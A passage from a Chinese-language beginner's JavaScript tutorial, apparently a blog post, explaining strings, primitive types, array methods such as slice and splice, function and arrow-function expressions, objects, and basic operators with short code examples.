class="hljs-title function_">charAt</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>结果均为 <code>l</code>。</p><h4 id="字符串的拼接与比较"><a href="#字符串的拼接与比较" class="headerlink" title="字符串的拼接与比较"></a>字符串的拼接与比较</h4><p>可以通过 <code>+</code> 直接拼接。</p><p>可以直接通过 <code>&gt;</code>，<code>&lt;</code>，<code>==</code>，<code>===</code> 等进行比较。比较时区分大小写。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a"</span> == <span class="hljs-string">"A"</span>);          <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a'</span> &gt;= <span class="hljs-string">'a'</span>);  <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"CUIT"</span> &lt; <span class="hljs-string">"cuit"</span>);         <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"CUI"</span> + <span class="hljs-string">'T'</span> === <span class="hljs-string">'CUIT'</span>);  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h4><p>通过y一对反引号 <code>`` </code> 创建的字符串为模板字符串。</p><p>模板字符串中可以通过 <code>${}</code> 插入变量并解析。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Name</span> = <span class="hljs-string">"victifa"</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Age</span> = <span class="hljs-number">18</span>;<br><span class="hljs-keyword">const</span> msg = <span class="hljs-string">`姓名：<span class="hljs-subst">${Name}</span>，年龄：<span class="hljs-subst">${Age}</span>`</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);<br></code></pre></td></tr></table></figure><p>最终输出：<code>姓名：victifa，年龄：18</code>。</p><h3 id="4-Boolean"><a href="#4-Boolean" class="headerlink" title="4. Boolean"></a>4. <code>Boolean</code></h3><p><code>true</code> 或 <code>false</code>。</p><h3 id="5-Null"><a href="#5-Null" class="headerlink" title="5. Null"></a>5. <code>Null</code></h3><p>表示不存在或无效的对象或地址引用。（通常是有意为之）</p><h3 id="6-Undefined"><a href="#6-Undefined" class="headerlink" title="6. Undefined"></a>6. <code>Undefined</code></h3><p>自动赋给刚声明的变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> n;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n, o);<span class="hljs-comment">// 均为 undefined</span><br><span class="hljs-keyword">var</span> o = <span class="hljs-number">12</span>;<br></code></pre></td></tr></table></figure><h3 id="7-Symbol"><a href="#7-Symbol" class="headerlink" title="7. Symbol"></a>7. <code>Symbol</code></h3><p>一种唯一且不可变的值，目的是创建唯一的属性键，保证不与代码中的其他键冲突。</p><p>通过 <code>Symbol([description])</code> 创建。其中，<code>description</code> 可以没有。</p><p>每一个通过 <code>Symbol()</code> 返回的值都是唯一的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"cuit"</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sym === <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"cuit"</span>));<span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h2><h3 id="1-数组-Array"><a href="#1-数组-Array" class="headerlink" title="1. 数组 Array"></a>1. 数组 <code>Array</code></h3><h4 id="数组的声明和读写"><a href="#数组的声明和读写" class="headerlink" title="数组的声明和读写"></a>数组的声明和读写</h4><p>我们可以将不同类型的数据存在同一个数组里。</p><p>数组声明时，不需要指明长度。</p><p>如下三种声明方式都是可以的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br><span class="hljs-keyword">let</span> arr2 = [<span class="hljs-number">1</span>, <span class="hljs-string">"vic"</span>, <span class="hljs-literal">true</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], arr1];<br><span class="hljs-keyword">let</span> arr3 = [];<br></code></pre></td></tr></table></figure><p>正常读写即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">arr2[<span class="hljs-number">1</span>] = <span class="hljs-string">"victifa"</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);<span class="hljs-comment">// 输出：[ 1, 'victifa', true, [ 1, 2, 3 ], [ 1, 2, 3, 4 ] ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>], arr2[<span class="hljs-number">4</span>][<span class="hljs-number">2</span>]);<span class="hljs-comment">// 输出：t 3</span><br><span class="hljs-comment">// 对于超出现有长度的更改，会自动地添加空槽来使数组变长</span><br>arr3[<span class="hljs-number">4</span>] = <span class="hljs-number">4</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr3);<span class="hljs-comment">// 输出：[ &lt;4 empty items&gt;, 4 ]</span><br></code></pre></td></tr></table></figure><h4 id="数组的成员"><a href="#数组的成员" class="headerlink" title="数组的成员"></a>数组的成员</h4><h5 id="1-arr-length"><a href="#1-arr-length" class="headerlink" title="1. arr.length"></a>1. <code>arr.length</code></h5><p>数组的长度。</p><p>数组的 <code>length</code> 属性与数值属性是相连接的。具体体现在：</p><ul><li>增加 <code>length</code> 会通过添加空槽来扩展数组，而不是创建任何新元素——甚至不会是 <code>undefined</code>。</li><li>减小 <code>length</code> 会截断数组。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr4 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br>arr4.<span class="hljs-property">length</span> = <span class="hljs-number">2</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr4);<span class="hljs-comment">// [ 1, 2 ]</span><br>arr4.<span class="hljs-property">length</span> = <span class="hljs-number">10</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr4);<span class="hljs-comment">// [ 1, 2, &lt;8 empty items&gt; ]</span><br></code></pre></td></tr></table></figure><h5 id="2-arr-pop-和-arr-push"><a href="#2-arr-pop-和-arr-push" class="headerlink" title="2. arr.pop() 和 arr.push()"></a>2. <code>arr.pop()</code> 和 <code>arr.push()</code></h5><p><code>arr.push()</code> 可以在数组末尾添加至少一个元素，<code>arr.pop()</code> 可以删除数组最后一个元素，并返回它（空数组返回 <code>undefined</code>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr5 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>arr5.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>);<br>arr5.<span class="hljs-title function_">push</span>(<span class="hljs-number">5</span>,<span class="hljs-number">6</span>);<br>arr5.<span class="hljs-title function_">push</span>([<span class="hljs-number">7</span>, <span class="hljs-number">8</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr5);<span class="hljs-comment">// 输出：[ 1, 2, 3, 4, 5, 6, [ 7, 8 ] ]</span><br><span class="hljs-keyword">let</span> tmp = arr5.<span class="hljs-title function_">pop</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp, arr5);<span class="hljs-comment">// 输出：[ 7, 8 ] [ 1, 2, 3, 4, 5, 6 ]</span><br></code></pre></td></tr></table></figure><h5 id="3-arr-slice"><a href="#3-arr-slice" class="headerlink" title="3. arr.slice()"></a>3. <code>arr.slice()</code></h5><p>用法： <code>arr.slice(start, end)</code>，返回一个数组（原数组从 <code>start</code> 到 <code>end</code> 的一个切片，但 <code>end</code> 不取）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr6 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br>arr6.<span class="hljs-property">length</span> = <span class="hljs-number">4</span>;<br>arr6.<span class="hljs-title function_">push</span>(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>);<br><span class="hljs-comment">// [ 1, 2 , empty, empty, 5, 6 ], arr6.length = 6</span><br></code></pre></td></tr></table></figure><p>参数 <code>end</code> 和 <code>start</code> 均为可选项，均不写返回完整的原数组，只写一个默认为 <code>start</code>，均存在时：</p><ol><li><p><code>start</code>：起始处的索引</p><ul><li><code>start &lt; 0</code>， 从数组末尾开始取，等价于 <code>start + arr.length</code></li><li>大于数组长度，不提去任何元素</li><li><code>&lt; -arr.length</code> 或没写，默认为 0</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">6</span>,<span class="hljs-number">5</span>));  <span class="hljs-comment">// 相当于取索引 [0,5) 的值：[ 2, &lt;2 empty items&gt;, 5 ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-number">7</span>, <span class="hljs-number">2</span>));<span class="hljs-comment">// 大于数组长度，不取了：[]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">7</span>, <span class="hljs-number">2</span>));<span class="hljs-comment">// 相当于取 [0,2) 的值：[ 1, 2 ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-string">''</span>,<span class="hljs-string">'2'</span>));<span class="hljs-comment">// 同上</span><br></code></pre></td></tr></table></figure></li><li><p><code>end</code>：终止处的索引</p><ul><li><code>start &lt; 0</code>， 从数组末尾开始取</li><li><code>&gt;= arr.length</code> 或没写，默认提取到数组末尾</li><li><code>&lt; -arr.length</code> 时，使用 0</li><li>通过上述三种方式规范后，若 <code>end &lt;= start</code>，则不提取</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">3</span>));<span class="hljs-comment">// 相当于索引 [0, 3) 的值：[ 1, 2, &lt;1 empty item&gt; ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>));<span class="hljs-comment">// 相当于索引 [0, 6] 的值：[ 1, 2, &lt;2 empty items&gt;, 5, 6 ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, ));<span class="hljs-comment">// 相当于索引 [0, 6] 的值：[ 1, 2, &lt;2 empty items&gt;, 5, 6 ]</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr6.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">7</span>));<span class="hljs-comment">// 相当于索引 [0, 0) 的值：[]</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="4-arr-splice"><a href="#4-arr-splice" class="headerlink" title="4. arr.splice()"></a>4. <code>arr.splice()</code></h5><p>用法：<code>splice(start, deleteCount, item1, item2, ···, itemN)</code>，用于就地移除数组元素并添加新的元素，或仅移除，仅添加，饭回删除的元素。</p><p>参数中， <code>start</code> 必须有，其余为可选项。</p><p>一下每一次输出均以原 <code>arr6</code>（<code>[ 1, 2 , empty, empty, 5, 6 ]</code>，length = 6） 为基础</p><ol><li><code>start</code>：开始改变的位置的索引<ul><li><code>&lt; 0</code> 或 <code>&lt; -arr.length</code>，同上进行规范化</li><li><code>&gt;= arr.length</code>，默认到数组末尾，表现为无法删除元素，仅能添加</li></ul></li><li><code>deleteCount</code>：从 <code>start</code> 开始，删除的元素数量<ul><li>不写，或大于等于从 <code>start</code> 开始到结束的元素的数量，则从 <code>start</code> 开始到结束的所有元素均删除</li><li><code>&lt;= 0</code>，不删除，但应至少指定一个新元素</li></ul></li><li><code>item</code>：从 <code>start</code> 开始，加入数组的元素。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> tmp = arr6.<span class="hljs-title function_">splice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-string">"Design"</span>, <span class="hljs-string">"ant."</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp, arr6);<br><span class="hljs-comment">// 删除:[ &lt;2 empty items&gt;, 5 ]，结果：[ 1, 2, 'Design', 'ant.', 6 ]</span><br><br><span class="hljs-comment">// 还是原来的 arr6</span><br><span class="hljs-keyword">let</span> tmp = arr6.<span class="hljs-title function_">splice</span>(-<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-string">"Designant"</span>, <span class="hljs-string">'.'</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp, arr6);<br><span class="hljs-comment">// 删除：[]，结果：[ 1, 'Designant', '.', 2, &lt;2 empty items&gt;, 5, 6 ]</span><br><br><span class="hljs-keyword">let</span> tmp = arr6.<span class="hljs-title function_">splice</span>(-<span class="hljs-number">7</span>, <span class="hljs-title class_">Infinity</span>, <span class="hljs-string">"Swan Song"</span>, <span class="hljs-string">"Astral Quantization"</span>, <span class="hljs-string">"Designant."</span> );<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tmp, arr6);<br><span class="hljs-comment">// 删除：[ 1, 2, &lt;2 empty items&gt;, 5, 6 ]，结果：[ 'Swan Song', 'Astral Quantization', 'Designant.' ]</span><br></code></pre></td></tr></table></figure><h5 id="5-arr-indexOf"><a href="#5-arr-indexOf" class="headerlink" title="5. arr.indexOf()"></a>5. <code>arr.indexOf()</code></h5><p>用法：<code>indexOf(searchElement, fromIndex)</code>，返回数组中第一次出现给定元素的下标（使用 <code>===</code> 判断，<code>empty</code> 会被跳过），不存在返回 -1。</p><p>两个参数中，<code>searchElement</code> 必须有，<code>fromIndex</code> 同上两种一样规范化。</p><p>以下展示了一个简单的应用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSongList</span>(<span class="hljs-params">songList, songName</span>) {<br><span class="hljs-keyword">if</span> (songList.<span class="hljs-title function_">indexOf</span>(songName) === -<span class="hljs-number">1</span>) {<br>songList.<span class="hljs-title function_">push</span>(songName);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`"<span class="hljs-subst">${songName}</span>" is now added to the collection.`</span>);<br>}<br><span class="hljs-keyword">else</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`"<span class="hljs-subst">${songName}</span>" is already in the collection.`</span>);<br>}<br>}<br><br><span class="hljs-keyword">let</span> songList = [ <span class="hljs-string">"Dual Doom Deathmatch"</span>, <span class="hljs-string">"Waltz for Lorelei"</span>, <span class="hljs-string">"Inverted World"</span>, <span class="hljs-string">"MVURBD"</span> ];<br><span class="hljs-title function_">updateSongList</span>(songList, <span class="hljs-string">"Vulcanus"</span>);<br><span class="hljs-title function_">updateSongList</span>(songList, <span class="hljs-string">"Inverted World"</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(songList);<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">"Vulcanus" is now added to the collection.</span><br><span class="hljs-comment">"Inverted World" is already in the collection.</span><br><span class="hljs-comment">[</span><br><span class="hljs-comment">  'Dual Doom Deathmatch',</span><br><span class="hljs-comment">  'Waltz for Lorelei',</span><br><span class="hljs-comment">  'Inverted World',</span><br><span class="hljs-comment">  'MVURBD',</span><br><span class="hljs-comment">  'Vulcanus'</span><br><span class="hljs-comment">]</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="2-函数-Function"><a href="#2-函数-Function" class="headerlink" title="2. 函数 Function"></a>2. 函数 <code>Function</code></h3><p>一个简单的函数的声明和使用见上方 <code>updateSongList</code> 函数即可。</p><p>下面着重看函数表达式和箭头函数。</p><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> function_expression = <span class="hljs-keyword">function</span> [name]([param1[, param2[, ..., paramN]]]) {<br>   <span class="hljs-comment">/* statements */</span><br>};<br></code></pre></td></tr></table></figure><p>其中， <code>[name]</code> 可以省略，从而创建匿名函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> factorial = <span class="hljs-keyword">function</span> (<span class="hljs-params">num</span>) {<br>    <span class="hljs-keyword">if</span> (num === <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">let</span> res = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++) {<br>            res *= i;<br>        }<br>        <span class="hljs-keyword">return</span> res;<br>    }<br>}<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">factorial</span>(<span class="hljs-number">10</span>));<br></code></pre></td></tr></table></figure><p>具体使用与普通的函数没什么差别。</p><h4 id="箭头函数表达式"><a href="#箭头函数表达式" class="headerlink" title="箭头函数表达式"></a>箭头函数表达式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">funcName</span> = (<span class="hljs-params">param1, ···, paramN</span>) =&gt; {<br>  <span class="hljs-comment">/* statements */</span><br>}<br></code></pre></td></tr></table></figure><p>当只有一个简单参时，可以省略参数的括号，简化为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">funcName</span> = param =&gt; {<br>  <span class="hljs-comment">/* statements */</span><br>}<br></code></pre></td></tr></table></figure><p>当函数直接返回表达式时，可以省去大括号：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">funcName</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;<br></code></pre></td></tr></table></figure><p>如下是一个简单的箭头函数应用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">fact</span> = num =&gt; {<br><span class="hljs-keyword">if</span> (num === <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">let</span> res = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++) {<br>            res *= i;<br>        }<br>        <span class="hljs-keyword">return</span> res;<br>    }<br>}<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">fact</span>(<span class="hljs-number">10</span>));<br></code></pre></td></tr></table></figure><h3 id="3-对象-Object"><a href="#3-对象-Object" class="headerlink" title="3. 对象 Object"></a>3. 对象 <code>Object</code></h3><p>把一堆键值对包裹起来，类似于字典。其中，属性键可以是字符串或 <code>Symbol</code> 类型，属性值任意。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> empty = {};<br><span class="hljs-keyword">const</span> sym = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"cuit"</span>);<br><span class="hljs-keyword">const</span> example = {<br><span class="hljs-attr">name</span>: <span class="hljs-string">"vic"</span>,<br><span class="hljs-attr">sym</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-attr">hi</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) { <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello"</span>; },<br>}<br></code></pre></td></tr></table></figure><h4 id="对象的读写"><a href="#对象的读写" class="headerlink" title="对象的读写"></a>对象的读写</h4><p>读取：<code>对象名['键名']</code> 或 <code>对象名.键名</code></p><p>写入：读取不存在的键时会添加这个键，并写入给出的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">example.<span class="hljs-property">name</span> = <span class="hljs-string">"victifa"</span>;<br>exapmle.<span class="hljs-property">age</span> = <span class="hljs-number">18</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(example.<span class="hljs-property">age</span>);<span class="hljs-comment">// 18</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(example[<span class="hljs-string">'name'</span>]);<span class="hljs-comment">// victifa</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(example.<span class="hljs-title function_">hi</span>());<span class="hljs-comment">// Hello</span><br></code></pre></td></tr></table></figure><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><ol><li>使用 <code>for-in</code> 遍历</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> example) {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`example.<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${example[key]}</span>`</span>);<br>}<br><span class="hljs-comment">/* 输出：</span><br><span class="hljs-comment">example.name: victifa</span><br><span class="hljs-comment">example.sym: true</span><br><span class="hljs-comment">example.hi: function() { return "Hello"; }</span><br><span class="hljs-comment">example.age: 18</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ol><li>使用 <code>Object.keys(对象名)</code> 获取所有键名</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> keys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(example);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; keys.<span class="hljs-property">length</span>; i++) {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`example.<span class="hljs-subst">${keys[i]}</span>: <span class="hljs-subst">${example[keys[i]]}</span>`</span>);<br>}<br><span class="hljs-comment">// 输出同上</span><br></code></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>使用 <code>delete</code> 删除键值对</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">delete</span> example.<span class="hljs-property">age</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>( <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(example) );<br><span class="hljs-comment">// [ 'name', 'sym', 'hi' ]</span><br></code></pre></td></tr></table></figure><h1 id="3-运算"><a href="#3-运算" class="headerlink" title="3. 运算"></a>3. 运算</h1><h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><p>区别较大的为除法 <code>/</code>，表示数学意义上的除法，向下取整需要使用 <code>Math.floor()</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> p = <span class="hljs-number">114</span> / <span class="hljs-number">514</span>;<span class="hljs-comment">// 0.22178988326848248</span><br><span class="hljs-keyword">let</span> q = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">114</span> / <span class="hljs-number">514</span>);    <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">let</span> r = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">114</span> / <span class="hljs-number">514</span>) + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 1</span><br></code></pre></td></tr></table></figure><h2 id="比较运算"><a href="#比较运算" class="headerlink" title="比较运算"></a>比较运算</h2><p>特殊的为 <code>===</code>（严格等于）和 <code>!==</code> （严格不等于）。</p><p>由于 javaScript 是弱类型语言，使用 <code>==</code>，<code>!=</code> 比较不同类型数据时会进行隐式转换，有时会导致意料之外的结果。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">5</span> == <span class="hljs-string">'5'</span>;<span class="hljs-comment">// true</span><br><span class="hljs-string">''</span> == <span class="hljs-string">'0'</span>;<span class="hljs-comment">// false</span><br><span class="hljs-string">''</span> == 